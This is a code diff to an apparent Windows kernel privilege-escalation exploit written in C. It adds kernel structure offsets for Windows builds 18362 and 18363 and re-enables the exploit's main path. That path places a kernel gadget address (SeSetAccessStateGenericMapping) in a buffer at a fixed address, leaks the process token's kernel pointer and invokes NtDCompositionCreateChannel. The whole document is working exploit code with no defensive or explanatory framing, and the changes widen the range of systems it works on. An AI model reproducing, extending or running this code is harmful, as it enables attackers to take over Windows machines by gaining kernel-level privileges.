@@ -214,6 +214,13 @@ BOOL InitEnvironment()
 
     switch (g_pExploitCtx->pPeb->OSBuildNumber)
     {
+    case 18362:
+    case 18363:
+        g_pExploitCtx->win32_process_offset = 0x3b0;
+        g_pExploitCtx->previous_mode_offset = 0x232;
+        g_pExploitCtx->GadgetAddrOffset = 0x50;
+        g_pExploitCtx->ObjectSize = 0x1a0;
+        break;
     case 19041:
     case 19042:
         g_pExploitCtx->win32_process_offset = 0x508;
@@ -486,42 +493,18 @@ int main(int argc, TCHAR* argv[]) {
     DWORD dwArg1, dwArg2;
     LoadLibrary(TEXT("user32"));
 
-    /*if (!InitEnvironment()) {
+    if (!InitEnvironment()) {
         printf("[-] Inappropriate Operating System\n");
         return 0;
     }
-
-    LPVOID pV = VirtualAlloc((LPVOID)0x11223344, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    LPVOID pV = VirtualAlloc((LPVOID)0xffffffff, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (!pV)
     {
-        printf("[-] Failed to allocate memory at address 0x11223344, please try again!\n");
+        printf("[-] Failed to allocate memory at address 0xffffffff, please try again!\n");
         return 0;
     }
-    DWORD64* Ptr = (DWORD64*)0x11223344;
+    DWORD64* Ptr = (DWORD64*)0xffffffff;
     DWORD64 GadgetAddr = GetGadgetAddr("SeSetAccessStateGenericMapping");
-    printf("[+] found SeSetAccessStateGenericMapping addr at: %p\n", (DWORD64)GadgetAddr);
-
-    memset(Ptr, 0xff, 0x1000);
-    printf("\n[+] Before setting gadget address in 0x11223344 + GadgetAddrOffset\n");
-    for (int i = 0; i < 0x10; i++) {
-        if (i % 4 == 0) {
-            puts("");
-        }
-        printf("%p ", *(Ptr + i));
-    }
-    puts("");
-
-    *(DWORD64*)((DWORD64)Ptr + g_pExploitCtx->GadgetAddrOffset) = GadgetAddr;
-
-    printf("\n[+] After setting gadget address in 0x11223344 + GadgetAddrOffset\n");
-    for (int i = 0; i < 0x10; i++) {
-        if (i % 4 == 0) {
-            puts("");
-        }
-        printf("%p ", *(Ptr + i));
-    }
-    puts("");
-
 
     HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
     if (!proc)
@@ -536,13 +519,12 @@ int main(int argc, TCHAR* argv[]) {
         return 0;
     }
 
-
     DWORD64 ktoken = GetKernelPointer(token, 0x5);
     where = ktoken + TOKEN_OFFSET;
-    printf("\n[+] where: %p\n", where);
-    printf("[+] where - 8 + 3: %p\n", where - 8 + 3);
 
-    */
+    memset(Ptr, 0xff, 0x1000);
+    *(DWORD64*)((DWORD64)Ptr + g_pExploitCtx->GadgetAddrOffset) = GadgetAddr;
+
     _NtDCompositionCreateChannel NtDCompositionCreateChannel;
     NtDCompositionCreateChannel = (_NtDCompositionCreateChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCreateChannel");
 
